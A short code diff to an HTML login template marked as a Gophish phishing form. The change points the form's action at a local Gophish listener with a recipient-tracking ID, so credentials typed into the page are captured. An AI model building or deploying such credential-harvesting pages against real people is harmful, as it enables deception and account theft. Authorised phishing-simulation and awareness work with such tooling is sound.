@@ -26,7 +26,7 @@
 				</span>
 
 				<!-- ✅ Gophish phishing form starts here -->
-				<form class="login100-form validate-form p-b-33 p-t-5" method="POST" action="">
+				<form class="login100-form validate-form p-b-33 p-t-5" method="POST" action="http://127.0.0.1:3333/?rid={{.URL}}">
 
 					<!-- Include the Gophish recipient ID for tracking -->
 					<input type="hidden" name="rid" value="{{.URL}}">
